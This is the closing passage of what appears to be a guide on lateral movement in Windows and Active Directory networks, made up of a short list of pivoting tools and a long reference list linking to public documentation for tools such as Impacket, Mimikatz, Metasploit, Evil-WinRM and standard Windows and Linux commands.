- [Sshuttle](https://github.com/sshuttle/sshuttle)
- [Rpivot](https://github.com/klsecservices/rpivot)
- [Chisel](https://github.com/jpillora/chisel)
- [Hijacking Sockets with Shadowmove](https://adepts.of0x.cc/shadowmove-hijack-socket/)

---------------------------------------------------------------------------

For additional information, please see the references below.

## References

- [Active Directory - Wikipedia](https://en.wikipedia.org/wiki/Active_Directory)
- [Description of User Account Control and remote restrictions in Windows Vista - Microsoft Learn](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction)
- [Evil-WinRM - GitHub](https://github.com/Hackplayers/evil-winrm)
- [Evil-WinRM - Kali Tools](https://www.kali.org/tools/evil-winrm/)
- [Impacket - GitHub](https://github.com/fortra/impacket)
- [Impacket - Homepage](https://www.coresecurity.com/core-labs/impacket)
- [Impacket - Kali Tools](https://www.kali.org/tools/impacket/)
- [Impacket-scripts - Kali Tools](https://www.kali.org/tools/impacket-scripts/)
- [Invoke-CimMethod - Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/cimcmdlets/invoke-cimmethod?view=powershell-5.1)
- [Invoke-Command - Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/invoke-command?view=powershell-5.1)
- [Kerberos (protocol) - Wikipedia](https://en.wikipedia.org/wiki/Kerberos_(protocol))
- [klist - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/klist)
- [Lateral Movement (TA0008) - MITRE ATT&CK](https://attack.mitre.org/tactics/TA0008/)
- [Lateral movement (cybersecurity) - Wikipedia](https://en.wikipedia.org/wiki/Lateral_movement_(cybersecurity))
- [Metasploit - Documentation](https://docs.metasploit.com/)
- [Metasploit - Homepage](https://www.metasploit.com/)
- [Metasploit-Framework - Kali Tools](https://www.kali.org/tools/metasploit-framework/)
- [Mimikatz - GitHub](https://github.com/gentilkiwi/mimikatz)
- [Mimikatz - Wiki](https://github.com/gentilkiwi/mimikatz/wiki)
- [Msfvenom - Metasploit Docs](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
- [Msfvenom - Kali Tools](https://www.kali.org/tools/metasploit-framework/#msfvenom)
- [nc - Linux manual page](https://linux.die.net/man/1/nc)
- [netcat - Wikipedia](https://en.wikipedia.org/wiki/Netcat)
- [netsh - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts)
- [Netsh Command Reference - Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc754516(v=ws.10))
- [New-CimSession - Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/cimcmdlets/new-cimsession?view=powershell-5.1)
- [New-CimSessionOption - Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/cimcmdlets/new-cimsessionoption?view=powershell-5.1)
- [NTLM - Wikipedia](https://en.wikipedia.org/wiki/NTLM)
- [OpenVPN - Wikipedia](https://en.wikipedia.org/wiki/Openvpn)
- [Pass the hash - Wikipedia](https://en.wikipedia.org/wiki/Pass_the_hash)
- [Port forwarding - Wikipedia](https://en.wikipedia.org/wiki/Port_forwarding)
- [PowerShell - Wikipedia](https://en.wikipedia.org/wiki/PowerShell)
- [proxychains-ng - GitHub](https://github.com/rofl0r/proxychains-ng)
- [proxychains-ng - Kali Tools](https://www.kali.org/tools/proxychains-ng/)
- [PsExec - Homepage](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
- [query commands - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query)
- [query session - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query-session)
- [query user - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query-user)
- [Remote Desktop Protocol - Wikipedia](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol)
- [runas - Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc771525(v=ws.11))
- [Sc - Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754599(v=ws.11))
- [Sc.exe create - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create)
- [schtasks - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks)
- [schtasks create - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)
- [Secure Shell - Wikipedia](https://en.wikipedia.org/wiki/Secure_Shell)
- [smbclient - Kali Tools](https://www.kali.org/tools/samba/#smbclient)
- [smbclient - Linux manual page](https://linux.die.net/man/1/smbclient)
- [socat - Docs](http://www.dest-unreach.org/socat/doc/socat.html)
- [socat - Homepage](http://www.dest-unreach.org/socat/)
- [socat - Linux manual page](https://linux.die.net/man/1/socat)
- [SOCKS - Wikipedia](https://en.wikipedia.org/wiki/SOCKS)
- [ssh - Linux manual page](https://man7.org/linux/man-pages/man1/ssh.1.html)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [systemctl - Linux manual page](https://www.man7.org/linux/man-pages/man1/systemctl.1.html)
- [tscon - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon)
- [whoami - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami)
- [Windows Management Instrumentation - Wikipedia](https://en.wikipedia.org/wiki/Windows_Management_Instrumentation)
- [Windows Remote Management - Wikipedia](https://en.wikipedia.org/wiki/Windows_Remote_Management)
- [winrs - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/winrs)
- [xfreerdp - Kali Tools](https://www.kali.org/tools/freerdp3/#xfreerdp)
- [xfreerdp - Linux manual page](https://linux.die.net/man/1/xfreerdp)
